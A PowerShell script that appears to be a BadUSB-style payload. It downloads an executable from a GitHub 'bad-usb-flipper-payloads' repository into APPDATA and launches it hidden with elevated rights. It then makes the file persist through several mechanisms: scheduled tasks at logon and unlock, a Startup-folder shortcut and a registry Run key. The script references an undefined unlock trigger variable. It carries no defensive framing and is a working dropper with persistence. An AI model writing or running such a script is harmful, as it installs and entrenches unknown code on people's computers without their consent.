# Variables

$exeUrl = "https://raw.githubusercontent.com/the-shadow-walker/bad-usb-flipper-payloads/main/EXE/WinUman.exe"
$exePath = "$env:APPDATA\WinUman.exe"
$shortcutName = "WinUman.lnk"
$shortcutPath = "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\$shortcutName"
$scheduledTaskName = "WinUmanResilient"

# --- 1. Download EXE ---
Invoke-WebRequest -Uri $exeUrl -OutFile $exePath -UseBasicParsing

# --- 2. Run EXE hidden with admin ---
Start-Process -FilePath $exePath -Verb RunAs -WindowStyle Hidden

# --- 3. Create Scheduled Task with Restart Settings and multiple triggers (logon + unlock) ---

# Create the scheduled task action
$action = New-ScheduledTaskAction -Execute $exePath

# Triggers: at logon AND on session unlock
$triggerLogon = New-ScheduledTaskTrigger -AtLogOn
# Add a secondary scheduled task that runs on session unlock
$exeEscaped = $exePath -replace '\\', '\\\\'
schtasks /Create /F /TN "WinUmanUnlock" /TR "$exeEscaped" /SC ONUNLOCK /RL HIGHEST /RU "$env:USERNAME"


# Settings: Restart up to 5 times if it crashes, 1 min interval, allow start on battery, don't stop on battery
$settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries `
    -RestartCount 5 -RestartInterval (New-TimeSpan -Minutes 1) -StartWhenAvailable

# Run as current user with highest privileges
$principal = New-ScheduledTaskPrincipal -UserId $env:USERNAME -LogonType Interactive -RunLevel Highest

# Define and register the task with both triggers
$task = New-ScheduledTask -Action $action -Trigger $triggerLogon, $triggerUnlock -Settings $settings -Principal $principal
Register-ScheduledTask -TaskName $scheduledTaskName -InputObject $task -Force

# --- 4. Create Startup Folder Shortcut as fallback ---
$WshShell = New-Object -ComObject WScript.Shell
$shortcut = $WshShell.CreateShortcut($shortcutPath)
$shortcut.TargetPath = $exePath
$shortcut.WorkingDirectory = Split-Path $exePath
$shortcut.WindowStyle = 7 # Minimized window
$shortcut.Description = "WinUman Startup Shortcut"
$shortcut.Save()

# --- 5. Add Registry Run key fallback ---
Set-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name "WinUman" -Value $exePath

Write-Host "Installation and persistence setup complete."
